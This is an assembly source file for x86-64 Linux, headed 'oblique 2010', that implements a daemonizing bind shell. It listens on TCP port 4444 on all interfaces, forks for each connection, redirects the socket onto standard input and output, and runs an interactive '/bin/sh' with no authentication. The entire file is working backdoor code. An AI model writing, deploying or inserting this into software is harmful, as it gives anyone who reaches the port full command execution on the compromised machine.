# oblique 2010

.text
.globl _start
_start:

# socket (AF_INET, SOCK_STREAM, 0)
    movq $2, %rdi       # AF_INET
    movq $1, %rsi       # SOCK_STREAM
    xorq %rdx, %rdx     # 0
    movq $41, %rax      # socket syscall number
    syscall
    
# bind(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, sizeof(struct sockaddr_in))
    movq %rax, %rdi     # sockfd
    pushq $0
    movq $0x5c11, %r10
    pushq %r10
    pushw $2
    movq %rsp, %rsi
    movq $16, %rdx
    movq $49, %rax
    syscall

# listen(sockfd, 0)
    xorq %rsi, %rsi
    movq $50, %rax
    syscall

    jmp accept
wait:
    pushq %rdi

    movq $-1, %rdi
    xorq %rsi, %rsi
    xorq %rdx, %rdx
    xorq %rcx, %rcx
    movq $61, %rax
    syscall

    popq %rdi

accept:
# accept(sockfd, NULL, NULL)
    xorq %rsi, %rsi
    xorq %rdx, %rdx
    movq $43, %rax
    syscall

    movq %rax, %r10

# fork()
    movq $57, %rax
    syscall

    test %rax, %rax
    jnz wait

# setsid()
    movq $112, %rax
    syscall 

# fork()
    movq $57, %rax
    syscall

    test %rax, %rax
    jnz exit

# dup2(newsockfd, 0..2)
    movq %r10, %rdi
    xorq %rsi, %rsi
dup2:
    movq $33, %rax
    syscall
    incq %rsi
    cmpb $3, %sil
    jne dup2

# execve("/bin/sh", ["/bin/sh", "-i"], 0)
    movq $0x692d, %r10
    pushq %r10
    movq %rsp, %r11
    movq $0x68732f6e69622f, %r10
    pushq %r10
    movq %rsp, %rdi
    pushq $0
    pushq %r11
    pushq %rdi
    movq %rsp, %rsi
    xorq %rdx, %rdx
    movq $59, %rax
    syscall

# _exit(0)
exit:
    xorq %rdi, %rdi
    movq $60, %rax
    syscall
